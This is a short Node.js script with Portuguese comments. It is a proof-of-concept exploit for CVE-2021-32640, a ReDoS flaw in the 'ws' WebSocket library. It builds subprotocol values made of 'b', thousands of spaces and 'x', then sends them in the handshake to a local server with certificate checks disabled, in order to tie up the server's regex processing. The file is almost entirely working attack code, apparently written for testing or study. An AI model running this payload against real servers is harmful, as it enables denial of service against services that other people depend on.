const WebSocket = require('ws');


// Uma função que constroi uma lista de subprotocolos de forma especial, usada para explorar a vulnerabiliadde
// CVE -2021-32640, simulando um ataque ReDos.
// A lista de subprotocolos tem o formato ['b...x', 'b ... x', ....] na qual '...' representa n espaços.
const protocol = () => {

  let protocols = [];

  for (const length of [1000, 2000, 4000, 8000, 16000, 32000]) {
    const value = 'b' + ' '.repeat(length) + 'x';

    protocols.push(value)
  }

  return protocols;
}

// Usa a lista de subprotocolos gerada na instância do websocket client, configurando o sec-websocket-protocol header
// e usado no handshake.
const ws = new WebSocket('wss://localhost:8080', protocol(), { rejectUnauthorized: false });

ws.on('open', function open() {
  ws.send('Something');
  ws.send('Something');
});

ws.on('message', function incoming(data) {
  console.log('Received: %s', data);
});
